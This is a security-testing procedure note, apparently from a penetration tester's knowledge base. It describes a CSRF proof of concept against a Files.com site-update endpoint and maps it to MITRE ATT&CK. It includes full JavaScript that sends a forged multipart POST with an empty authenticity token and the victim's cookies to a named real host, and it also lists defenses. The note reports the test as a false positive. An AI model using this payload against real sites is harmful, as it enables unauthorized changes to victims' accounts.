---
id: proc-test-csrf-submission
tags:
  - csrf
  - testing
  - javascript
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/submit-csrf-poc-xmlhttprequest]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:23.631Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Modified-CSRF-Form-Submission

## Summary

This procedure executes the modified CSRF PoC HTML in a browser to submit a forged request to the Files.com site update endpoint, checking for successful unauthorized configuration changes while including session cookies for authentication.

## Description

The test simulates a real CSRF attack where a victim visits a malicious page, triggering an XMLHttpRequest POST to https://gaming2.brickftp.com/sites/update with multipart/form-data. The request includes withCredentials=true to send cookies, bypassing same-origin policy for authenticated actions. In this scenario, the submission appeared successful (e.g., site name updated), but investigation showed the duplicate unmodified token prevented actual changes, confirming a false positive.

## Requirements

1. Modified CSRF PoC HTML file.
2. Browser with developer tools (e.g., Chrome) and same-session cookies for the target site.
3. Network access to the Files.com instance.
4. JavaScript execution enabled.

## Defense

Defensive measures and detection strategies:

- Validate CSRF tokens server-side and reject requests without valid tokens.
- Set strict SameSite=Strict/Lax on session cookies to block cross-site usage.
- Use Content Security Policy (CSP) to restrict script execution from untrusted origins.
- Monitor server logs for POST requests to sensitive endpoints from unexpected referers.

## Objectives

1. Verify if the null token allows form submission and setting updates.
2. Confirm authentication via cookies works in cross-site context.
3. Assess impact of perceived bypass on site configurations.
4. Expected outcome: Apparent success with response code 200, but no real changes due to token duplication.

## Instructions

### Step 1: Load PoC in Browser

**Context**: Host or open the HTML file locally to prepare for execution.

**Instructions**: Save the modified HTML as a .html file and open it in a browser. Ensure you're logged into the target Files.com site in the same browser session.

### Step 2: Trigger Submission

**Context**: Execute the JavaScript function to send the forged request.

**Instructions**: Click the submit button in the PoC, which calls submitRequest(). This uses XMLHttpRequest to POST the multipart body to https://gaming2.brickftp.com/sites/update with headers like Content-Type: multipart/form-data; boundary=... and withCredentials=true.

**Command** ([[commands/submit-csrf-poc-xmlhttprequest]]):
```javascript
var xhr = new XMLHttpRequest(); xhr.open("POST", "https://gaming2.brickftp.com/sites/update", true); xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5"); xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------13127814166702694341666648723"); xhr.withCredentials = true; var body = "-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"utf8\"\r\n\r\n\xe2\x9c\x93\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\npatch\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"authenticity_token\"\r\n\r\n\r\n\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"group\"\r\n\r\ngeneral\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"site[name]\"\r\n\r\ngamingtoooorrrrr\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"site[subdomain]\"\r\n\r\ngaming2\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"site[email]\"\r\n\r\nhmahmoud@promex.me\r\n... [other parameters like site[language]=en, site[bundle_expiration]=30, etc.] ...\r\n-----------------------------13127814166702694341666648723\r\nContent-Disposition: form-data; name=\"commit\"\r\n\r\nSave\r\n-----------------------------13127814166702694341666648723--\r\n"; var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody]));
```

> This command sends the POST with empty authenticity_token, modified parameters, and includes cookies. Monitor the Network tab in dev tools for the request/response.

### Step 3: Verify Results

**Context**: Check if settings updated and investigate any discrepancies.

**Instructions**: After submission, refresh the Files.com configuration page to see if changes (e.g., site name) applied. Use server logs or further testing to confirm duplicate token protection.

**Expected Output**: HTTP 200 response with redirect or success message; apparent update, but actual settings unchanged.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/submit-csrf-poc-xmlhttprequest]]

## Tools Used


## Tags

- [[csrf]]
- [[testing]]
- [[JavaScript]]
- [[web]]
